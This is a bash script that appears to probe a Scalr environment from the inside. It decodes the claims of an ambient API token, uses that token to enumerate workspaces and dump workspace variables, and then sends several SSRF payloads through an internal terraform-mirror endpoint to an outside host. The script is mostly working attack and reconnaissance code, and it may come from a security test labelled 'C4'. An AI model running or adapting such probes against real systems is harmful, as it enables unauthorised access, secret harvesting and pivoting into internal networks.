#!/usr/bin/env bash

echo "=== SCALR_TOKEN claims ==="
echo "$SCALR_TOKEN" | cut -d. -f2 | python3 -c "
import sys, base64, json
raw = sys.stdin.read().strip()
pad = raw + '=' * (4 - len(raw) % 4)
try:
    decoded = base64.urlsafe_b64decode(pad)
    claims = json.loads(decoded)
    print(json.dumps(claims, indent=2))
except Exception as e:
    print('err:', e)
"

echo ""
echo "=== SCALR_TOKEN: access to current workspace ==="
RESP=$(curl -sk --max-time 5 -w "\n%{http_code}" \
  "https://$SCALR_HOSTNAME/api/iacp/v3/workspaces/$SCALR_WORKSPACE_ID" \
  -H "Authorization: Bearer $SCALR_TOKEN")
STATUS=$(echo "$RESP" | tail -1); BODY=$(echo "$RESP" | head -1)
echo "HTTP $STATUS"
echo "$BODY" | python3 -c "
import sys,json
d=json.load(sys.stdin)
a=d['data']['attributes']
print('name:', a.get('name'), '| env:', d['data']['relationships'].get('environment',{}).get('data',{}).get('id'))
" 2>&1 || echo "raw: $(echo $BODY | head -c 200)"

echo ""
echo "=== SCALR_TOKEN: can it read other workspaces? ==="
RESP=$(curl -sk --max-time 5 -w "\n%{http_code}" \
  "https://$SCALR_HOSTNAME/api/iacp/v3/workspaces?page%5Bsize%5D=10" \
  -H "Authorization: Bearer $SCALR_TOKEN")
STATUS=$(echo "$RESP" | tail -1); BODY=$(echo "$RESP" | head -1)
echo "HTTP $STATUS"
echo "$BODY" | python3 -c "
import sys,json
d=json.load(sys.stdin)
wss=d.get('data',[])
print('visible workspaces:', len(wss))
for w in wss: print(' -', w['id'], w['attributes'].get('name','?'))
" 2>&1 || echo "raw response: $(echo $BODY | head -c 300)"

echo ""
echo "=== SCALR_TOKEN: workspace variables ==="
RESP=$(curl -sk --max-time 5 -w "\n%{http_code}" \
  "https://$SCALR_HOSTNAME/api/iacp/v3/workspaces/$SCALR_WORKSPACE_ID/vars" \
  -H "Authorization: Bearer $SCALR_TOKEN")
STATUS=$(echo "$RESP" | tail -1); BODY=$(echo "$RESP" | head -1)
echo "HTTP $STATUS"
echo "$BODY" | python3 -c "
import sys,json
d=json.load(sys.stdin)
vs=d.get('data',[])
print('vars count:', len(vs))
for v in vs:
    a=v['attributes']
    print(' -', a.get('key'), 'sensitive='+str(a.get('sensitive')), 'value='+str(a.get('value'))[:40] if not a.get('sensitive') else '[hidden]')
" 2>&1 || echo "raw response: $(echo $BODY | head -c 300)"

echo ""
echo "=== C4 SSRF baseline: mirror endpoint reachable? ==="
curl -sk --max-time 5 -o /dev/null -w "HTTP %{http_code}\n" \
  "https://internal.main.scalr.dev/terraform-mirror/test.json"

echo ""
echo "=== C4 SSRF: https:// path on internal LB (path-as-is) ==="
curl -sk --max-time 8 --no-location --path-as-is -D - \
  "https://internal.main.scalr.dev/terraform-mirror/https://httpbin.org/status/200" \
  2>/dev/null | grep -E "^HTTP/|^[Ll]ocation:" | head -3

echo ""
echo "=== C4 SSRF: URL-encoded scheme on internal LB ==="
curl -sk --max-time 8 --no-location --path-as-is -D - \
  "https://internal.main.scalr.dev/terraform-mirror/https%3A%2F%2Fhttpbin.org%2Fstatus%2F200" \
  2>/dev/null | grep -E "^HTTP/|^[Ll]ocation:" | head -3

echo ""
echo "=== C4 SSRF: http (port 80) on internal LB ==="
curl -sk --max-time 8 --no-location --path-as-is -D - \
  "http://internal.main.scalr.dev/terraform-mirror/https://httpbin.org/status/200" \
  2>/dev/null | grep -E "^HTTP/|^[Ll]ocation:" | head -3

echo ""
echo "=== C4 SSRF: double-slash with path-as-is on internal LB ==="
curl -sk --max-time 8 --no-location --path-as-is -D - \
  "https://internal.main.scalr.dev/terraform-mirror//httpbin.org/status/200" \
  2>/dev/null | grep -E "^HTTP/|^[Ll]ocation:" | head -3

echo "=== done ==="
